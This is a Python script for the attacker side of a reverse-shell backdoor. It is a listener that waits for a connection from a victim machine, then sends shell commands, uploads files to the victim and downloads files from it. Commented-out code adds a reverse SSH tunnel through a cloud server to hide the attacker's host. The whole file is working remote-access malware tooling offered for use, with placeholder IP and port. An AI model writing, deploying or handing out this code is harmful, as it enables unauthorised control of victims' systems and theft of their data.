#!/usr/bin/python

#This script should be run on the hackers host machine from where they intend to remotely access the victim system.

import socket, json, base64, subprocess, sys, time

class Listener:

    # This function is only needed if you do not want to expose your hacker system but have an intermediary SSH server you want to expose and tunnel communication from. 
    # def setup_reverse_ssh_tunnel():
    #     command = ["autossh", "f", "-N", "-R", "6000:localhost:5000", "user@"+cloud_server_ip]
    #     while True:
    #         try:
    #             subprocess.Popen(command)
    #             print("Reverse SSH tunnel established.")
    #         except Exception as e:
    #             print(f"Error establishing reverse SSH tunnel: {e}")

    def __init__(self, hacker_ip, hacker_port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((hacker_ip, hacker_port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    #send command to backdoor
    def send_to_backdoor(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
    
    #receive returned output from backdoor
    def receive_from_backdoor(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    #remotely executes command in the backdoor/victim system and displays output in the listener
    def execute_remotely(self, command):
        self.send_to_backdoor(command)
        if command[0] == "exit":
            self.connection.close() #close the socket
            exit() # exit the python program
        return self.receive_from_backdoor()
    
    #function for malware download feature
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    #function for malware upload feature
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            try:
                # if first input argument is upload, run the malware upload function
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode())
                elif command[0] == "cd" and len(command) > 2:
                    command[1] = " ".join(command[1:])
                    
                # run execute remotely function to exceute the command entered in the listener and store the returned output in result
                result = self.execute_remotely(command)
                
                # if first input argument is download, run the malware download function
                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result) #result is whatever write_file() returns which in this case is "[+] Download successful."
            except Exception:
                result = "[-] Error during command execution."

            print(result) #returns for example "[+] Download successful."

# You need to change this to your PrivIP (should be in quotes) & Port before running this.
# Hacker port should be the same as the port set in reverse_backdoor.py
my_listener = Listener("hacker_privateIP", hacker_port)
my_listener.run()



# Uncomment if using the setup_reverse_ssh_tunnel() function
# cloud_server_ip = input("Enter the public IP address of the server running your SSH reverse tunnel: ")
